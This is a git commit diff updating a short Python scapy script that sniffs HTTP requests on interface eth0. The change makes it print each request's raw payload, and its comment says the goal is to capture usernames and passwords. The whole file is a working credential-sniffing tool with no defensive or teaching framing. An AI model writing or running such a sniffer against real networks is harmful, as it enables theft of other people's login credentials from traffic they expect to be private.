ea7cc3bb3eac13712fae1ca5570931ffffcaacbc
syntax-eror <46492218+syntax-eror@users.noreply.github.com>
2019-05-06 20:25:14 -0700

    Update packetsniffer.py

--- packetsniffer.py
+++ packetsniffer.py
@@ -4,12 +4,16 @@
 
 import scapy.all as scapy
 from scapy.layers import http
+#pip install scapy-http / scapy_http
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        print(packet.show) #packet.show will give field of packet
+        if packet.haslayer(scapy.Raw):
+            print(packet[scapy.Raw].load) #print specific field, in this case user+pwd hopefully
+            #print(packet.show) #packet.show will give field of packet
+        
 
 sniff("eth0")
